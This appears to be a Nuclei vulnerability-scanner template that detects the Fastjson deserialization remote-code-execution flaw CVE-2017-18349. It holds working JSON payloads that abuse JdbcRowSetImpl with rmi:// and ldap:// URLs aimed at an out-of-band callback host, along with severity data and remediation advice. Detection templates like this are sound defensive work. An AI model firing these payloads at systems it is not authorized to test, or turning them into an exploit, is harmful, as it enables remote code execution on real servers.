http:
- body: "{\n  \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n  \"dataSourceName\"\
    : \"{{rmi_payload}}\",\n  \"autoCommit\": true\n}\n"
  extractors:
  - kval:
    - interactsh_ip
    type: kval
  headers:
    Accept: application/json
    Content-Type: application/json
  matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol,'dns')
    - contains(content_type, 'application/json')
    - contains_all(body, 'autoCommit','set property error')
    type: dsl
  method: POST
  path:
  - '{{BaseURL}}/json'
  - '{{BaseURL}}/api/json'
  stop-at-first-match: true
- body: "{\n  \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n  \"dataSourceName\"\
    : \"{{ldap_payload}}\",\n  \"autoCommit\": true\n}\n"
  extractors:
  - kval:
    - interactsh_ip
    type: kval
  headers:
    Accept: application/json
    Content-Type: application/json
  matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol,'dns')
    - contains(content_type, 'application/json')
    - contains_all(body, 'autoCommit','set property error')
    type: dsl
  method: POST
  path:
  - '{{BaseURL}}/json'
  - '{{BaseURL}}/api/json'
  - '{{BaseURL}}/parse'
  - '{{BaseURL}}/deserialize'
  stop-at-first-match: true
- body: "{\n  \"data\": {\n    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n   \
    \ \"dataSourceName\": \"{{rmi_payload}}\",\n    \"autoCommit\": true\n  }\n}\n"
  extractors:
  - kval:
    - interactsh_ip
    type: kval
  headers:
    Accept: application/json
    Content-Type: application/json
  matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol,'dns')
    - contains(content_type, 'application/json')
    - contains_all(body, 'autoCommit','set property error')
    type: dsl
  method: POST
  path:
  - '{{BaseURL}}/json'
  - '{{BaseURL}}/api/json'
  - '{{BaseURL}}/parse'
  - '{{BaseURL}}/deserialize'
  stop-at-first-match: true
- body: "{\n  \"b\": {\n    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n    \"\
    dataSourceName\": \"{{ldap_payload}}\",\n    \"autoCommit\": true\n  }\n}\n"
  extractors:
  - kval:
    - interactsh_ip
    type: kval
  headers:
    Accept: application/json
    Content-Type: application/json
  matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol,'dns')
    - contains(content_type, 'application/json')
    - contains_all(body, 'autoCommit','set property error')
    type: dsl
  method: POST
  path:
  - '{{BaseURL}}/json'
  stop-at-first-match: true
id: CVE-2017-18349
info:
  author: night
  classification:
    cpe: cpe:2.3:a:alibaba:fastjson:*:*:*:*:*:*:*:*
    cve-id: CVE-2017-18349
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-20
    epss-percentile: 0.99701
    epss-score: 0.92231
  description: 'parseObject in Fastjson before 1.2.25, as used in FastjsonEngine in
    Pippo 1.11.0 and other products, allows remote attackers to execute arbitrary
    code via a crafted JSON request, as demonstrated by a crafted rmi-// URI in the
    dataSourceName field of HTTP POST data to the Pippo /json URI, which is mishandled
    in AjaxApplication.java.

    '
  impact: 'Successful exploitation allows complete system compromise through remote
    code execution, enabling attackers to execute arbitrary commands, access sensitive
    data, and establish persistent backdoors on the target system.

    '
  metadata:
    product: fastjson
    vendor: alibaba
    verified: true
  name: Fastjson Insecure Deserialization - Remote Code Execution
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2017-18349
  - https://github.com/alibaba/fastjson/wiki/security_update_20170315
  - https://github.com/pippo-java/pippo/issues/466
  - https://github.com/h0cksr/Fastjson--CVE-2017-18349-
  - https://fortiguard.com/encyclopedia/ips/44059
  - https://www.exploit-db.com/exploits/45983
  remediation: 'Update Fastjson to version 1.2.25 or later which includes security
    patches for this vulnerability.Disable autotype functionality by setting `fastjson.parser.autoTypeSupport=false`.Implement
    strict whitelist filtering for `@type` annotations, validate and sanitize all
    JSON input.Use Web Application Firewalls (WAF) to filter malicious requests, and
    regularly audit dependencies for known vulnerabilities. Consider migrating to
    safer JSON parsing libraries like Jackson with secure configurations.

    '
  severity: critical
  tags: cve,cve2017,fastjson,deserialization,rce,oob,oast,vkev,vuln
variables:
  ldap_payload: ldap://{{interactsh-url}}/{{randstr}}
  rmi_payload: rmi://{{interactsh-url}}/{{randstr}}
